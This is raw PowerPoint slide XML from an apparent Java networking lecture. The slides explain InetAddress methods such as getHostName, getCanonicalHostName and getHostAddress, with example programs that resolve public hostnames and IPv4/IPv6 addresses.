                <a:gridCol w="3977552"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" b="1">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Scenario</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>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a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getHostName()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>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a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getCanonicalHostName()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>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a:effectLst/>
                        </a:rPr>
                        <a:t>Localhost</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US">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System hostname</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Same as getHostName()</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a:effectLst/>
                        </a:rPr>
                        <a:t>IP Address Input</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US">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Reverse DNS or IP string</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Same as getHostName()</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a:effectLst/>
                        </a:rPr>
                        <a:t>Domain Name Input</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US">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Returns input domain (cached)</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Resolves canonical name via DNS</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US" b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Performance</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr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effectLst/>
                        </a:rPr>
                        <a:t>May use cache</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US">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effectLst/>
                        </a:rPr>
                        <a:t>May trigger fresh DNS lookup</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="0">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="130645" marR="130645" marT="65322" marB="653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546226" y="152400"/>
            <a:ext cx="7775575" cy="114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lvl="2" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>getCanonicalHostName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>method</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49155" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1752601" y="990600"/>
            <a:ext cx="8424863" cy="556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endParaRPr lang="en-US" altLang="zh-CN" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49156" name="矩形 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1546226" y="1448187"/>
            <a:ext cx="9053512" cy="4647426"/>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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>java.net.*;</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>DomainName2 {</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public static void outHostName(InetAddress address, String s)</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System.out.println(" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Create </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>object through </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>" + s + " ");</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System.out.println(" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Host name </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: " +address.getCanonicalHostName());</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System.out.println(" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Host alias </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: " + address.getHostName());</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System.out.println("");</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 </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public static void </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>main(String[] args) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>throws </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Exception{</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outHostName(InetAddress.getLocalHost(), "getLocalHost </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>method </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>");</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outHostName(InetAddress.getByName("www.ibm.com"), "www.ibm.com");</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outHostName(InetAddress.getByName("www.126.com"), "www.126.com");</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outHostName(InetAddress.getByName("202.108.9.77"), "202.108.9.77");</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outHostName(InetAddress.getByName("211.100.26.121"), "211.100.26.121");</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>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546226" y="152400"/>
            <a:ext cx="7775575" cy="114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lvl="2" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>getCanonicalHostName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>method</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50179" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1752601" y="990600"/>
            <a:ext cx="8424863" cy="556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endParaRPr lang="en-US" altLang="zh-CN" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400"/>
              <a:t>Running results:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5018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34013" y="1178719"/>
            <a:ext cx="5257800" cy="5491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1752601" y="990600"/>
            <a:ext cx="8424863" cy="556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en-US" sz="2400"/>
              <a:t>This method is used to get the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400"/>
              <a:t>address of the host. This </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400"/>
              <a:t>address may be an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400"/>
              <a:t>IPv4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400"/>
              <a:t>address or an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400"/>
              <a:t>IPv6 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400"/>
              <a:t>address </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000"/>
              <a:t>. Method definition:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400"/>
              <a:t>The following code demonstrates how to use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400"/>
              <a:t>getHostAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400"/>
              <a:t>to obtain </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400"/>
              <a:t>IPv4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400"/>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400"/>
              <a:t>IPv6 addresses, as well as how to obtain all IP addresses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400"/>
              <a:t>of the local machine .</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1981201" y="1905001"/>
            <a:ext cx="8348663" cy="3397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a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public String getHostAddress()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1524001" y="914400"/>
            <a:ext cx="9053513" cy="54165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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>java.net.*;</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>GetIP{</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public static void </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>main(String[] args) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>throws </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Exception{</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Output </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>IPv4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>address</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress ipv4Address1 = InetAddress.getByName("1.2.3.4");</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System.out.println("ipv4Address1: " + ipv4Address1.getHostAddress());</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InetAddress ipv4Address2 = InetAddress.getByName("www.ibm.com");</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System.out.println("ipv4Address2: " + ipv4Address2.getHostAddress());</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InetAddress ipv4Address3 = InetAddress.getByName("www.szu.edu.cn");</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System.out.println("ipv4Address3: " + ipv4Address3.getHostAddress());</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Output </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>IPv6 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>address</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress ipv6Address1 = InetAddress.getByName("abcd:123::22ff");</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System.out.println("ipv6Address1: " + ipv6Address1.getHostAddress());</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InetAddress ipv6Address2 = InetAddress.getByName("www.neu6.edu.cn");</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System.out.println("ipv6Address2: " + ipv6Address2.getHostAddress());</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Output all </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>addresses of this machine</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
